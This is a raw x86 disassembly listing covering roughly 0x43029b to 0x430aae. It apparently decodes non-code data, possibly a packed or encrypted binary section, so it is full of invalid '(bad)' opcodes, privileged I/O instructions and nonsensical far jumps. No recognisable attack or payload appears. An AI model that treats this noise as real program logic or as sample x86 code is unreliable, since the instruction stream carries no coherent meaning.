  43029b:	jle    0x430223
  43029d:	pop    ebx
  43029e:	jne    0x4302cf
  4302a0:	ja     0x430314
  4302a2:	lahf   
  4302a3:	mov    bh,0x4a
  4302a5:	jecxz  0x4302fa
  4302a7:	aad    0x65
  4302a9:	arpl   WORD PTR [ebp-0x64],cx
  4302ac:	std    
  4302ad:	nop
  4302ae:	int3   
  4302af:	xchg   esp,eax
  4302b0:	xchg   ebp,eax
  4302b1:	jmp    0xc61572cc
  4302b6:	push   ebp
  4302b7:	inc    DWORD PTR [ebx+ebp*1-0x21]
  4302bb:	mov    eax,0xf97126c5
  4302c0:	leave  
  4302c1:	mov    al,0xb6
  4302c3:	jns    0x4302f9
  4302c5:	inc    esi
  4302c6:	push   ds
  4302c7:	mov    bl,0x38
  4302c9:	retf   0xe339
  4302cc:	test   BYTE PTR [esi-0x63ff64d1],0x3
  4302d3:	and    eax,0x5465b492
  4302d8:	mov    bl,BYTE PTR [esi-0x44]
  4302db:	std    
  4302dc:	js     0x430281
  4302de:	pop    es
  4302df:	aad    0xf2
  4302e1:	arpl   WORD PTR [edi],bp
  4302e3:	ror    DWORD PTR [esi],1
  4302e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302e6:	test   eax,0x7b71dd10
  4302eb:	dec    eax
  4302ec:	push   ebx
  4302ed:	mov    dh,0x9f
  4302ef:	pop    ebx
  4302f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4302f1:	xchg   BYTE PTR [eax],bh
  4302f3:	es mov cl,0x15
  4302f6:	xor    bh,BYTE PTR [ebx+0x52965f89]
  4302fc:	xor    BYTE PTR [ecx+0x46],cl
  4302ff:	aad    0xb7
  430301:	pusha  
  430302:	or     ah,bl
  430304:	outs   dx,BYTE PTR ds:[esi]
  430305:	mov    ebx,0x6418760d
  43030a:	pop    esp
  43030b:	stos   BYTE PTR es:[edi],al
  43030c:	call   0xb680:0xe9d96a57
  430313:	pop    ds
  430314:	inc    ecx
  430315:	sbb    al,0xdc
  430317:	sbb    eax,0x5be07719
  43031c:	mov    ecx,0x8892c626
  430321:	sub    eax,0x898f0af
  430326:	out    0x27,al
  430328:	pop    ecx
  430329:	add    ebx,DWORD PTR [edx+0x40]
  43032c:	test   BYTE PTR [edx+0x1fccbd4a],dl
  430332:	add    ebx,DWORD PTR [edi-0x78]
  430335:	imul   ecx,DWORD PTR [eax+0x3558c012],0x3405a730
  43033f:	sbb    eax,0x7c1a7d83
  430344:	xchg   edi,eax
  430345:	pop    esi
  430346:	pop    ds
  430347:	fwait
  430348:	ins    DWORD PTR es:[edi],dx
  430349:	call   FWORD PTR [ecx]
  43034b:	ret    0x15fc
  43034e:	push   ds
  43034f:	je     0x4302f6
  430351:	mov    dh,ch
  430353:	pop    esi
  430354:	sahf   
  430355:	adc    al,0xaa
  430357:	cmc    
  430358:	mov    BYTE PTR [ecx+ebx*8],bl
  43035b:	jg     0x4303cc
  43035d:	push   cs
  43035e:	pop    ds
  43035f:	test   eax,0x26dac211
  430364:	mov    dl,cl
  430366:	(bad)  
  430367:	loopne 0x43033e
  430369:	add    bl,BYTE PTR [eax]
  43036b:	cmp    DWORD PTR [edi],edi
  43036d:	outs   dx,BYTE PTR ds:[esi]
  43036e:	shl    BYTE PTR [ebx-0x7df6afa7],cl
  430374:	xchg   esi,eax
  430375:	ins    DWORD PTR es:[edi],dx
  430376:	je     0x4303e5
  430378:	xchg   bh,bl
  43037a:	xchg   ebx,eax
  43037b:	ret    
  43037c:	dec    ebx
  43037d:	rcl    edx,1
  43037f:	inc    esp
  430380:	push   0x3ed4c27a
  430385:	in     eax,dx
  430386:	daa    
  430387:	stc    
  430388:	in     al,dx
  430389:	push   bx
  43038b:	xchg   esp,eax
  43038c:	mov    BYTE PTR [edi-0x16],dl
  43038f:	sbb    ecx,DWORD PTR [edi]
  430391:	mov    ebx,0xf333fd6a
  430396:	xchg   ecx,eax
  430397:	pop    eax
  430398:	or     BYTE PTR [ebx-0x2f035883],ch
  43039e:	lahf   
  43039f:	cmp    DWORD PTR [ecx+ebx*8-0x5c],0xffffffb8
  4303a4:	xchg   ecx,eax
  4303a6:	repnz dec ecx
  4303a8:	adc    esi,DWORD PTR [eax-0x4247ff41]
  4303ae:	js     0x430385
  4303b0:	into   
  4303b1:	fcomip st,st(7)
  4303b3:	sbb    ecx,edi
  4303b5:	jle    0x43038c
  4303b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4303b8:	jle    0x430370
  4303ba:	cwde   
  4303bb:	stos   DWORD PTR es:[edi],eax
  4303bc:	push   ebx
  4303bd:	add    ebp,DWORD PTR ds:0xfafc942f
  4303c3:	icebp  
  4303c4:	in     al,0x2
  4303c6:	or     BYTE PTR [ebx-0x70fff522],cl
  4303cc:	fistp  WORD PTR [edi+0x3e]
  4303cf:	loope  0x430359
  4303d1:	mov    ds:0xc282d52b,eax
  4303d6:	(bad)
  4303d9:	add    ch,BYTE PTR [edx]
  4303db:	not    BYTE PTR es:[ebp+0x6b0a2c7a]
  4303e2:	ins    DWORD PTR es:[edi],dx
  4303e3:	loope  0x4303ba
  4303e5:	sub    eax,0x74a928f4
  4303ea:	fisub  WORD PTR [esi+0x744c0357]
  4303f0:	enter  0x5cab,0xc6
  4303f4:	jmp    0xcdae:0x77cd66a7
  4303fb:	test   eax,0x7232b292
  430400:	add    bl,BYTE PTR gs:[eax-0xe]
  430404:	push   0xffffffd1
  430406:	mov    esi,0x600de248
  43040b:	jno    0x430485
  43040d:	dec    esp
  43040e:	or     ecx,DWORD PTR [edi]
  430410:	mov    BYTE PTR [edi+0x38daaa4b],0xa9
  430417:	adc    eax,0x57dba3bc
  43041c:	(bad)  
  43041d:	shl    BYTE PTR [esi+edi*8],cl
  430420:	mov    bl,ch
  430422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430423:	dec    ebx
  430424:	dec    esi
  430425:	test   eax,0x28185e8
  43042a:	push   eax
  43042b:	sbb    dh,BYTE PTR [ebp+0x60b3d0dd]
  430431:	enter  0x8365,0xe5
  430435:	adc    al,0x84
  430437:	or     eax,DWORD PTR [eax+eax*1]
  43043a:	mov    cl,0x24
  43043c:	push   eax
  43043d:	jno    0x430416
  43043f:	mov    cl,0x5c
  430441:	test   eax,0xb65ab89b
  430446:	mov    al,ds:0x292c4427
  43044b:	mov    dl,0x68
  43044d:	adc    al,0x61
  43044f:	mov    ds:0x99ebc934,eax
  430454:	xor    BYTE PTR [ebx],dl
  430456:	loopne 0x4304ce
  430458:	or     eax,0x3a05e1c3
  43045d:	ret    
  43045e:	add    bh,dl
  430460:	cld    
  430461:	test   eax,0xff7d6171
  430466:	inc    edx
  430467:	retf   0x29f8
  43046a:	inc    esi
  43046b:	call   0x2464:0x722f4ddc
  430472:	push   esi
  430473:	mov    DWORD PTR [edi-0x2664e1b8],ebx
  430479:	loope  0x430431
  43047b:	mov    eax,ecx
  43047d:	add    eax,0xefd3b838
  430482:	out    0xc2,al
  430484:	shl    BYTE PTR [ebp+0x1f],0xff
  430488:	ss (bad) 
  43048a:	(bad)  
  43048b:	jnp    0x430467
  43048d:	jo     0x4304e6
  43048f:	aad    0x53
  430491:	xor    bh,ah
  430493:	xor    ch,dh
  430495:	ds inc esi
  430497:	push   ebx
  430498:	mov    BYTE PTR [ebp-0x7a],dh
  43049b:	push   0xa9b4846f
  4304a0:	aad    0x89
  4304a2:	stc    
  4304a3:	sbb    eax,0xea1c1e89
  4304a8:	js     0x43043e
  4304aa:	xor    al,0xc0
  4304ac:	mov    ch,dl
  4304ae:	or     DWORD PTR [edi+edx*2],0xb60dc1f9
  4304b5:	add    ch,BYTE PTR [eax-0xca8af8c]
  4304bb:	xor    DWORD PTR [esp+ecx*1+0x60],0xffffffd9
  4304c0:	stc    
  4304c1:	(bad)  
  4304c2:	imul   esp,ecx,0x22
  4304c5:	inc    edi
  4304c6:	pop    ss
  4304c7:	aam    0x61
  4304c9:	lahf   
  4304ca:	xchg   edi,eax
  4304cb:	bound  ebp,QWORD PTR [eax-0x13]
  4304ce:	rcl    BYTE PTR [ecx+0x7671ef88],1
  4304d4:	in     eax,0x8b
  4304d6:	or     al,0xb0
  4304d8:	cmp    edx,DWORD PTR ds:0x9ff42c1a
  4304de:	addr16 mov ch,0x72
  4304e1:	pop    eax
  4304e2:	jnp    0x4304da
  4304e4:	xchg   esp,eax
  4304e5:	stos   DWORD PTR es:[edi],eax
  4304e6:	sub    BYTE PTR [edx-0x63c2bd04],cl
  4304ec:	and    dl,ch
  4304ee:	icebp  
  4304ef:	aam    0x68
  4304f1:	or     ax,0x9961
  4304f5:	(bad)  
  4304f7:	sbb    al,0x88
  4304f9:	test   DWORD PTR [ebx],0xe4f72c58
  4304ff:	mov    eax,0x68cc02a9
  430504:	ins    BYTE PTR es:[edi],dx
  430505:	es ins DWORD PTR es:[edi],dx
  430507:	adc    ch,bh
  430509:	lea    edi,[esi+0x41]
  43050c:	sub    ebp,DWORD PTR [edx-0x2e7feb44]
  430512:	pop    ebp
  430513:	rol    BYTE PTR [ebp-0x24d847fe],0xdb
  43051a:	shl    DWORD PTR [edx+eiz*8-0x5144a9df],1
  430521:	shr    DWORD PTR [esi-0x53],cl
  430524:	mov    bh,0x43
  430526:	ins    DWORD PTR es:[edi],dx
  430527:	mov    DWORD PTR [eax-0x30ac4906],ebp
  43052d:	add    eax,0x5a69f278
  430532:	pop    es
  430533:	mov    edx,0x3b7600ae
  430538:	lea    ecx,[edi-0x69a4e1a]
  43053e:	sub    ebx,eax
  430540:	retf   0xd4f6
  430543:	aam    0x6b
  430545:	dec    eax
  430546:	inc    edx
  430547:	and    DWORD PTR [ecx],ebp
  430549:	sahf   
  43054a:	enter  0x8945,0x1d
  43054e:	sbb    eax,0xb884676
  430553:	xor    BYTE PTR [esi],ch
  430555:	add    bl,dl
  430557:	add    al,0x19
  430559:	add    al,0xd8
  43055b:	jecxz  0x430532
  43055d:	pop    ebx
  43055e:	imul   DWORD PTR [ebx+0x5f5e71f9]
  430564:	pop    ebp
  430565:	add    ebp,DWORD PTR [esi-0x34]
  430568:	inc    ebp
  430569:	push   ebx
  43056a:	pop    edi
  43056b:	cwde   
  43056c:	xor    al,0x1f
  43056e:	xor    BYTE PTR [ecx-0x6169ca4b],0x4c
  430575:	cmp    bh,BYTE PTR [edx+eax*4-0x78]
  430579:	mov    ebp,0x75d9ccb6
  43057e:	push   ds
  43057f:	jg     0x4305c3
  430581:	pop    ds
  430582:	inc    ebp
  430583:	ret    0x7b28
  430586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430587:	aad    0xfa
  430589:	cmp    DWORD PTR [ebx-0x27c285fb],esi
  43058f:	aaa    
  430590:	cmp    DWORD PTR [eax+0x2b88c697],ebx
  430596:	aad    0xee
  430598:	icebp  
  430599:	jmp    0x77a:0x31446bb
  4305a0:	rcl    BYTE PTR [edx-0x51fe3478],cl
  4305a6:	sub    BYTE PTR [ebx+0x2245dd88],dh
  4305ac:	and    DWORD PTR ds:0xab4716e8,esi
  4305b2:	das    
  4305b3:	aaa    
  4305b4:	pusha  
  4305b5:	add    cl,dh
  4305b7:	out    0xdf,eax
  4305b9:	push   0xc181a1bc
  4305be:	ins    DWORD PTR es:[edi],dx
  4305bf:	xchg   edi,eax
  4305c0:	sub    BYTE PTR [esi],bl
  4305c2:	jle    0x43057e
  4305c4:	and    DWORD PTR [edi+ebx*4+0x8],edi
  4305c8:	into   
  4305c9:	lods   eax,DWORD PTR ds:[esi]
  4305ca:	push   0xffffffd4
  4305cc:	or     al,0xc8
  4305ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4305cf:	pusha  
  4305d0:	loope  0x430611
  4305d2:	pop    esi
  4305d3:	test   eax,0x3b842388
  4305d8:	adc    eax,0xfdc6df1d
  4305dd:	in     al,dx
  4305de:	mov    al,ds:0x240592d5
  4305e3:	test   DWORD PTR [eax-0x71],0x64e55bd7
  4305ea:	push   ds
  4305eb:	or     eax,DWORD PTR [eax]
  4305ed:	fcomp  DWORD PTR [edi+ecx*8-0x65a381f4]
  4305f4:	retf   
  4305f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4305f6:	and    eax,0xc88bbc25
  4305fb:	push   ebp
  4305fc:	and    bl,0x91
  4305ff:	jae    0x43064d
  430601:	loope  0x430663
  430603:	inc    ebx
  430604:	ja     0x430587
  430606:	cmp    DWORD PTR [ecx-0x2a15d0c4],esp
  43060c:	shr    DWORD PTR [eax],1
  43060e:	and    eax,0x50b48a5c
  430613:	sub    al,0x89
  430615:	mov    ecx,0x22645878
  43061a:	hlt    
  43061b:	arpl   WORD PTR [ebp+0x1723121c],dx
  430621:	adc    ebx,DWORD PTR ds:0x65737896
  430627:	ss popa 
  430629:	(bad)  [edi-0x117b1c9b]
  43062f:	sahf   
  430630:	mov    BYTE PTR [eax],dh
  430632:	lahf   
  430633:	les    ebx,FWORD PTR [eax-0x74387711]
  430639:	retf   0x7b3
  43063c:	(bad)  
  43063d:	icebp  
  43063e:	mov    ebx,0x4f7aeef4
  430643:	rol    BYTE PTR [edi+0x4ea77c8c],cl
  430649:	add    ebp,DWORD PTR [ecx]
  43064b:	xchg   esp,eax
  43064c:	inc    esi
  43064d:	or     bl,cl
  43064f:	adc    BYTE PTR [edx+0x6d27c413],ch
  430655:	push   0x3fda461e
  43065a:	mov    BYTE PTR [edi-0x16880395],dl
  430660:	xchg   ebx,eax
  430661:	inc    ebx
  430662:	pop    ecx
  430663:	pushf  
  430664:	or     eax,DWORD PTR [esi+0x30899253]
  43066a:	dec    esi
  43066b:	add    al,0x7c
  43066d:	jl     0x430637
  43066f:	test   DWORD PTR [ecx+0x1126d3af],0xb776a9cb
  430679:	add    eax,0x7dce7ee0
  43067e:	stc    
  43067f:	add    BYTE PTR [edi-0x7e],0x9d
  430683:	pslld  mm2,QWORD PTR [edi+edi*1]
  430687:	outs   dx,DWORD PTR ds:[esi]
  430688:	pop    ss
  430689:	sub    BYTE PTR [esi],bh
  43068b:	icebp  
  43068c:	pusha  
  43068d:	xor    dl,BYTE PTR [esi-0x2c]
  430690:	add    BYTE PTR [edx],bl
  430692:	das    
  430693:	mov    ds:0x682601f9,eax
  430698:	xchg   bl,ah
  43069a:	ret    0xa16e
  43069d:	scas   eax,DWORD PTR es:[edi]
  43069e:	mov    al,ds:0x67be223e
  4306a3:	aad    0xfc
  4306a5:	ds mov dl,0xe1
  4306a8:	dec    edx
  4306a9:	pop    esp
  4306aa:	mov    dl,0xee
  4306ac:	mov    BYTE PTR [ebx-0x52554c7a],ch
  4306b2:	push   ds
  4306b3:	stos   DWORD PTR es:[edi],eax
  4306b4:	and    al,0x2
  4306b6:	bound  esi,QWORD PTR [ebp+0x18]
  4306b9:	scas   eax,DWORD PTR es:[edi]
  4306ba:	jns    0x4306b9
  4306bc:	pop    esi
  4306bd:	cs push ds
  4306bf:	cmp    esp,DWORD PTR [ebp+0x6ec3de06]
  4306c5:	push   eax
  4306c6:	(bad)  
  4306c7:	pushf  
  4306c8:	imul   edi,edi,0xffffffc6
  4306cb:	push   ebp
  4306cc:	int    0xf8
  4306ce:	outs   dx,DWORD PTR ds:[esi]
  4306cf:	pop    ecx
  4306d0:	pop    ebp
  4306d1:	retf   0x4013
  4306d4:	mov    DWORD PTR ds:0xcafaad2,esi
  4306da:	mov    bh,0x3e
  4306dc:	mov    bl,BYTE PTR gs:[ebp-0x68e976b4]
  4306e3:	and    al,0x4c
  4306e5:	rcl    BYTE PTR [edi+eax*2-0x64ebb627],cl
  4306ec:	mov    DWORD PTR [ebp+0x36],ecx
  4306ef:	test   DWORD PTR [ebp+ecx*2+0x145d6061],ecx
  4306f6:	cmp    bl,dl
  4306f8:	imul   esi,DWORD PTR [ebp-0x54],0xffffffd5
  4306fc:	clc    
  4306fd:	shl    DWORD PTR [edi+0x22],0x89
  430701:	mov    ebx,0x963600fe
  430706:	into   
  430707:	pop    ebx
  430708:	adc    al,0x1d
  43070a:	or     dl,BYTE PTR [edi-0x4b0ff8ca]
  430710:	test   eax,0x9773627e
  430715:	push   ebx
  430716:	pusha  
  430717:	mov    eax,0xe8b054c4
  43071c:	leave  
  43071d:	sti    
  43071e:	inc    edi
  43071f:	out    dx,eax
  430720:	nop
  430721:	add    eax,0x783b99f2
  430726:	test   BYTE PTR [edx],0x49
  430729:	jb     0x43074a
  43072b:	xchg   edi,eax
  43072c:	mov    dl,0x99
  43072e:	inc    esp
  43072f:	jecxz  0x430737
  430731:	pop    edi
  430732:	xchg   edx,eax
  430733:	aam    0x76
  430735:	dec    esp
  430736:	add    DWORD PTR [ebx-0x5f],ecx
  430739:	xor    DWORD PTR [ebp+edx*2+0x5d0e8989],ebx
  430740:	in     al,dx
  430741:	sbb    al,0x5
  430743:	jno    0x43074a
  430745:	adc    al,0xe
  430747:	inc    esi
  430748:	gs in  al,0x98
  43074b:	stos   DWORD PTR es:[edi],eax
  43074c:	pop    edi
  43074d:	mov    al,0x65
  43074f:	dec    edx
  430750:	ins    DWORD PTR es:[edi],dx
  430751:	icebp  
  430752:	push   ds
  430753:	xchg   edi,eax
  430754:	inc    eax
  430755:	jmp    0xdcb7b41
  43075a:	pop    esi
  43075b:	adc    DWORD PTR [edx+0x44955620],ebp
  430761:	add    esp,DWORD PTR [eax-0x12]
  430764:	adc    al,0xf9
  430766:	or     ecx,esp
  430768:	xchg   DWORD PTR [ebp+0x6975451f],ecx
  43076e:	retf   0xb429
  430771:	loop   0x4307d8
  430773:	sahf   
  430774:	iret   
  430775:	lds    edi,FWORD PTR [edi]
  430777:	push   edi
  430778:	adc    eax,0xd6921de9
  43077d:	pop    edx
  43077e:	fsubrp st(6),st
  430780:	mov    bl,ah
  430782:	rdmsr  
  430784:	test   BYTE PTR [esi+0x5b1738e],cl
  43078a:	push   esp
  43078b:	inc    esi
  43078c:	mov    al,0xc
  43078e:	test   eax,0x1fced6f5
  430793:	fst    DWORD PTR [ebp-0x6f]
  430796:	arpl   WORD PTR [edx],si
  430798:	iret   
  430799:	pop    esp
  43079a:	dec    edx
  43079b:	adc    eax,0xf44c1d6
  4307a0:	(bad)  
  4307a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307a2:	sbb    ax,0x8367
  4307a6:	out    0x21,eax
  4307a8:	pop    esi
  4307a9:	sub    DWORD PTR [edx],0xffffffff
  4307ac:	rol    DWORD PTR ds:0x8fa8fecc,cl
  4307b2:	pop    ss
  4307b3:	(bad)  
  4307b5:	or     al,0x1f
  4307b7:	add    esi,DWORD PTR [ecx+0x50dc4ad7]
  4307bd:	inc    esp
  4307be:	adc    esp,0x85a7b695
  4307c4:	scas   eax,DWORD PTR es:[edi]
  4307c5:	mov    edx,0xe389e21b
  4307ca:	add    dh,dl
  4307cc:	(bad)  [ebx]
  4307ce:	outs   dx,DWORD PTR ds:[esi]
  4307cf:	test   al,0x4c
  4307d1:	ret    0xd4ca
  4307d4:	mov    ds:0x7efe0be,eax
  4307d9:	mov    bl,0x81
  4307db:	out    0xb6,al
  4307dd:	fwait
  4307de:	(bad)  
  4307df:	loopne 0x43076a
  4307e1:	dec    eax
  4307e2:	call   0x4eab2fa2
  4307e7:	cmp    eax,0xbf59095e
  4307ec:	jns    0x43076e
  4307ee:	cmp    esi,DWORD PTR [ecx+eiz*4-0x1faa890b]
  4307f5:	mov    dl,0xe5
  4307f7:	lahf   
  4307f8:	xchg   ebp,eax
  4307f9:	aas    
  4307fa:	xchg   edx,eax
  4307fb:	(bad)  
  4307fc:	xor    eax,DWORD PTR [ebx-0x53]
  4307ff:	out    0x50,al
  430801:	mov    ds:0xddcd4e9,eax
  430806:	xchg   ebp,eax
  430807:	out    0x6d,eax
  430809:	and    al,0x79
  43080b:	sub    BYTE PTR [ecx-0x672ed66b],cl
  430811:	inc    esp
  430812:	xor    al,BYTE PTR [esi-0x17c7fa66]
  430818:	into   
  430819:	mov    ebp,0x7307f7b
  43081e:	sbb    eax,DWORD PTR [edx]
  430820:	mov    ch,dl
  430822:	ins    DWORD PTR es:[edi],dx
  430823:	retf   
  430824:	add    eax,0xc2fe753e
  430829:	add    cl,BYTE PTR [esi+0x4]
  43082c:	in     eax,dx
  43082d:	fstp   st(4)
  43082f:	into   
  430830:	dec    esi
  430831:	(bad)  
  430832:	pop    ds
  430833:	pop    ebp
  430834:	ror    ecx,0xaf
  430837:	or     BYTE PTR [edx-0x3b],dl
  43083a:	adc    al,0xd4
  43083c:	dec    edi
  43083d:	lea    ebp,es:0xe9cacaae
  430844:	push   ecx
  430845:	jae    0x43084e
  430847:	pop    ebx
  430848:	mov    BYTE PTR [edi+0x5399b94],bl
  43084e:	jnp    0x4307fd
  430850:	sbb    al,BYTE PTR [edx]
  430852:	ins    BYTE PTR es:[edi],dx
  430853:	pop    esp
  430854:	dec    ebp
  430855:	in     eax,0x5a
  430857:	xchg   ebp,eax
  430858:	int3   
  430859:	(bad)  
  43085a:	pop    ds
  43085b:	shr    DWORD PTR [edx],1
  43085d:	dec    esi
  43085e:	pop    edx
  43085f:	adc    al,0x16
  430861:	mov    ?,WORD PTR [esp+edx*8-0x53]
  430865:	ret    0x23ad
  430868:	push   eax
  430869:	inc    ebx
  43086a:	sub    cl,BYTE PTR cs:[eax-0x7f60a463]
  430871:	out    0x2f,eax
  430873:	jg     0x43081a
  430875:	pop    ss
  430876:	in     al,dx
  430877:	sar    DWORD PTR [edi+0x3037184d],0xf9
  43087e:	fisubr WORD PTR [eax-0x7c]
  430881:	pop    ecx
  430882:	inc    esi
  430883:	icebp  
  430884:	push   ss
  430885:	fsubr  DWORD PTR [edi]
  430887:	in     al,0x2d
  430889:	add    al,al
  43088b:	adc    DWORD PTR [ecx+0x17],edx
  43088e:	xchg   ecx,eax
  43088f:	mov    dl,0xa0
  430891:	mov    edx,0x31f15360
  430896:	int    0x98
  430898:	data16 jp 0x43089f
  43089b:	lahf   
  43089c:	addr16 inc ecx
  43089e:	enter  0x4ed7,0x97
  4308a2:	push   0xa9e26dc4
  4308a7:	mov    cl,0x78
  4308a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4308aa:	pop    ds
  4308ab:	xchg   DWORD PTR [esi-0x44],edi
  4308ae:	jge    0x430877
  4308b0:	add    BYTE PTR [ebp+0x2f],dh
  4308b3:	(bad)  
  4308b4:	in     al,dx
  4308b5:	add    dh,BYTE PTR [esi+0x2723b7a6]
  4308bb:	add    ebp,edx
  4308bd:	call   0x5cd3:0xee2f4f65
  4308c4:	fst    QWORD PTR [edx+0x49]
  4308c7:	mov    ds:0xd06402e8,eax
  4308cc:	retf   
  4308cd:	jl     0x4308c7
  4308cf:	mov    ebp,0x237b6926
  4308d4:	in     al,0x34
  4308d6:	sahf   
  4308d7:	push   esp
  4308d8:	int3   
  4308d9:	lods   al,BYTE PTR ds:[esi]
  4308da:	popa   
  4308db:	retf   0x1c56
  4308de:	stos   BYTE PTR es:[edi],al
  4308df:	mov    DWORD PTR [ecx-0x72c67f3],eax
  4308e5:	mov    dh,0xef
  4308e7:	mov    cl,0x88
  4308e9:	leave  
  4308ea:	xor    DWORD PTR [edx],0x1f0e7e45
  4308f0:	sahf   
  4308f1:	jne    0x430919
  4308f3:	cmc    
  4308f4:	imul   eax,DWORD PTR [ebx],0x7c17abbe
  4308fa:	in     eax,0xfe
  4308fc:	cli    
  4308fd:	mov    ds:0xe5a4e57b,al
  430902:	pop    es
  430903:	push   edi
  430904:	jb     0x430897
  430906:	dec    ecx
  430907:	mov    dh,0x87
  430909:	add    dl,BYTE PTR [edx+0xb]
  43090c:	into   
  43090d:	add    edi,DWORD PTR [esi+ecx*4+0x2f]
  430911:	dec    ebx
  430912:	push   esi
  430913:	cdq    
  430914:	mov    ecx,0xeaa160ad
  430919:	lods   eax,DWORD PTR ds:[esi]
  43091a:	cmp    eax,0xefe3fcb9
  43091f:	aam    0x70
  430921:	mov    eax,ds:0x92ff7f3f
  430926:	and    eax,0x711d4152
  43092b:	pop    ds
  43092c:	into   
  43092d:	push   cs
  43092e:	(bad)  
  43092f:	aam    0x25
  430931:	lahf   
  430932:	sbb    al,0x84
  430934:	je     0x4308c5
  430936:	or     DWORD PTR ds:0x1437a88e,esp
  43093c:	add    al,0xbc
  43093e:	lahf   
  43093f:	jmp    0x37c:0x779298b3
  430946:	es inc ecx
  430948:	push   edx
  430949:	adc    ah,BYTE PTR [ebx]
  43094b:	retf   0x2b5
  43094e:	fs push ebp
  430950:	pop    edx
  430951:	xor    esi,DWORD PTR [ecx-0x8]
  430954:	repnz lea ebx,[edx-0x22e7c573]
  43095b:	jmp    0x43099a
  43095d:	mov    esi,0x61abb762
  430962:	sar    DWORD PTR [esi],cl
  430964:	jg     0x4308f9
  430966:	xor    al,0xe7
  430968:	ror    DWORD PTR [ecx+0x76873995],cl
  43096e:	dec    esp
  43096f:	fs mov ch,0xc4
  430972:	in     eax,0x9a
  430974:	push   ss
  430975:	adc    ch,BYTE PTR [esi-0x72]
  430978:	pop    es
  430979:	je     0x430956
  43097b:	push   ecx
  43097c:	stc    
  43097d:	repnz pusha 
  43097f:	jmp    0x430943
  430981:	ret    
  430982:	add    al,0x81
  430984:	or     al,0x6d
  430986:	pop    ds
  430987:	adc    DWORD PTR [edi+0x4d3c06b1],0xffffffbb
  43098e:	(bad)  
  43098f:	js     0x4309f5
  430991:	mov    BYTE PTR [ebx],0xd7
  430994:	sub    BYTE PTR [ecx+0x2e],0x1b
  430998:	dec    ecx
  430999:	es push ds
  43099b:	ja     0x43095e
  43099d:	push   ebx
  43099e:	xor    eax,0x9bd84aaf
  4309a3:	aam    0x37
  4309a5:	not    BYTE PTR [esi-0x6572679a]
  4309ab:	sahf   
  4309ac:	mov    ebx,DWORD PTR [ecx-0x79]
  4309af:	jge    0x43098e
  4309b1:	mov    bh,0xc2
  4309b3:	cmp    ebp,DWORD PTR [eax+0xa]
  4309b6:	cmp    edi,edx
  4309b8:	scas   eax,DWORD PTR es:[edi]
  4309b9:	add    al,BYTE PTR [ecx-0x58]
  4309bc:	cdq    
  4309bd:	dec    esi
  4309be:	loope  0x4309b5
  4309c0:	mov    DWORD PTR [ecx],eax
  4309c2:	or     dl,BYTE PTR [eax]
  4309c4:	mov    cl,0xda
  4309c6:	gs daa 
  4309c8:	xor    al,0x2
  4309ca:	and    di,WORD PTR [ebx+0x60]
  4309ce:	cld    
  4309cf:	imul   esi,DWORD PTR [edx-0x5d],0x4
  4309d3:	add    DWORD PTR [esi+0x9f2c2fb],esi
  4309d9:	inc    esi
  4309da:	jno    0x43096b
  4309dc:	imul   BYTE PTR [eax]
  4309de:	cmc    
  4309df:	lahf   
  4309e0:	xchg   DWORD PTR [edx+0x50],edx
  4309e3:	push   esp
  4309e4:	inc    ebp
  4309e6:	repz out 0xb2,eax
  4309e9:	push   ds
  4309ea:	push   ds
  4309eb:	mov    cl,0xcc
  4309ed:	retf   
  4309ee:	xor    eax,0x45b61455
  4309f3:	aad    0xec
  4309f5:	imul   ebp,DWORD PTR [edi-0x76],0xfffffff0
  4309f9:	scas   al,BYTE PTR es:[edi]
  4309fa:	dec    edi
  4309fb:	jns    0x430986
  4309fd:	push   ecx
  4309fe:	cli    
  4309ff:	inc    esp
  430a00:	sub    bl,cl
  430a02:	inc    ebx
  430a03:	les    edx,FWORD PTR [esi+0x4dd4f00e]
  430a09:	loop   0x430a31
  430a0b:	mov    eax,?
  430a0d:	add    al,0x39
  430a0f:	mov    ebp,0x14f60189
  430a14:	ss mov eax,cs:0x44023d43
  430a1b:	loope  0x4309da
  430a1d:	inc    edx
  430a1e:	mov    edx,0x62b8cbbd
  430a23:	push   edi
  430a24:	xchg   esi,eax
  430a25:	call   0x99c9a62a
  430a2a:	aad    0x4
  430a2c:	add    al,0x73
  430a2e:	and    esp,edx
  430a30:	push   eax
  430a31:	pop    eax
  430a32:	jns    0x4309e7
  430a34:	xor    ah,cl
  430a36:	ficomp DWORD PTR [ebx-0x74488878]
  430a3c:	sub    al,0x11
  430a3e:	sbb    eax,0xf000e0f7
  430a43:	jl     0x430a4a
  430a45:	sub    BYTE PTR [ebx],0xc1
  430a48:	out    dx,eax
  430a49:	mov    ch,0x5c
  430a4b:	mov    edi,0x1048a388
  430a50:	inc    ebx
  430a51:	sub    al,0xc8
  430a53:	inc    esi
  430a54:	fld    QWORD PTR [edx]
  430a56:	cmp    al,0x7b
  430a58:	add    dl,BYTE PTR [ecx]
  430a5a:	mov    ah,0xfc
  430a5c:	or     DWORD PTR [edx+0x60],edx
  430a5f:	xor    DWORD PTR [eax-0x63eea648],esp
  430a65:	jnp    0x430a53
  430a67:	hlt    
  430a68:	mov    dh,0xf8
  430a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a6b:	aad    0x25
  430a6d:	mov    edx,0x29ab6319
  430a72:	inc    DWORD PTR [edx]
  430a74:	xchg   BYTE PTR [edi-0x57],dh
  430a77:	out    0x4d,eax
  430a79:	es push ds
  430a7b:	test   al,0xe2
  430a7d:	test   BYTE PTR [ebp+0x72b86ad4],ch
  430a83:	das    
  430a84:	out    dx,al
  430a85:	or     BYTE PTR [edi-0x4ad00e7d],ah
  430a8b:	mov    dh,BYTE PTR [ebx]
  430a8d:	mov    WORD PTR [ebx-0x2f],ds
  430a90:	or     BYTE PTR [eax-0xde14c76],ch
  430a96:	fstp   QWORD PTR [eax-0x4cf4cb07]
  430a9c:	mov    edx,0x1f89b205
  430aa1:	stc    
  430aa2:	popa   
  430aa3:	fimul  WORD PTR [ecx-0x13884437]
  430aa9:	mov    dl,0x2a
  430aab:	adc    al,0x86
  430aad:	pop    ds
  430aae:	cmp    al,0x3
